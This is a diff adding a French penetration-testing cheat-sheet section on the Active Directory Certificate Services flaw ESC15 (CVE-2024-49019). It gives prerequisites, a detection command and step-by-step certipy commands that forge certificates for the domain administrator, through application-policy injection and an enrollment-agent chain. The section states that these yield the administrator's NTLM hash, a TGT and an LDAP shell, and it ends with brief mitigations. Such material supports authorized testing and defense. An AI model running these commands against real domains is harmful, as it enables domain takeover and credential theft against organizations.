@@ -197,3 +197,84 @@ Cherche :
 * `[*] Remarks ESC15`
 
 ***
+
+### <mark style="color:red;">ESC15 (ADCS - EKUwu / CVE-2024-49019)</mark>
+
+#### Description
+
+**ESC15** exploite une vulnérabilité dans les CA non patchées permettant d'injecter des **Application Policies** arbitraires dans un certificat, même si le template ne les autorise pas.
+
+#### Prérequis
+
+* Template avec **Enrollee Supplies Subject = True**
+* Template avec **Schema Version = 1**
+* CA **non patchée** pour CVE-2024-49019 (patch Nov 2024)
+* Droits d'enrollment sur le template
+
+#### Indicateurs de vulnérabilité
+
+```bash
+certipy find -target dc.domain.local -u user -p 'password' -vulnerable -stdout
+```
+
+Rechercher:
+
+* `Enrollee Supplies Subject: True`
+* `Schema Version: 1`
+* `[!] Vulnerabilities: ESC15`
+
+#### Exploitation - Scénario A (Authentification directe)
+
+**Injection de Client Authentication:**
+
+```bash
+# Demander un certificat avec Client Auth injecté
+certipy req -u user -p 'password' -dc-ip 10.10.11.1 -target dc.domain.local \
+  -ca CA-NAME -template VulnerableTemplate \
+  -upn administrator@domain.local \
+  -application-policies 'Client Authentication'
+
+# Tenter l'authentification LDAP
+certipy auth -pfx administrator.pfx -dc-ip 10.10.11.1 -ldap-shell
+```
+
+**Limitation:** Peut échouer avec `CA_MD_TOO_WEAK` selon la configuration SSL.
+
+#### Exploitation - Scénario B (via ESC3/Enrollment Agent)
+
+**1. Créer un certificat avec privilege d'agent:**
+
+```bash
+certipy req -u user -p 'password' -dc-ip 10.10.11.1 -target dc.domain.local \
+  -ca CA-NAME -template VulnerableTemplate \
+  -upn administrator@domain.local \
+  -application-policies 'Certificate Request Agent'
+```
+
+**2. Utiliser ce certificat pour en demander un autre:**
+
+```bash
+certipy req -u user -p 'password' -dc-ip 10.10.11.1 -target dc.domain.local \
+  -ca CA-NAME -template User \
+  -pfx user_agent.pfx \
+  -on-behalf-of 'DOMAIN\Administrator'
+```
+
+**3. S'authentifier avec le certificat final:**
+
+```bash
+certipy auth -pfx administrator.pfx -dc-ip 10.10.11.1
+```
+
+#### Résultat
+
+* Hash NTLM de l'administrateur
+* TGT (Ticket Granting Ticket)
+* Fichier `.ccache` pour Pass-the-Ticket
+
+#### Mitigation
+
+* Appliquer le patch Microsoft de novembre 2024
+* Upgrader les templates vers Schema Version 2+
+* Désactiver "Enrollee Supplies Subject" si non nécessaire
+* Auditer régulièrement les templates ADCS
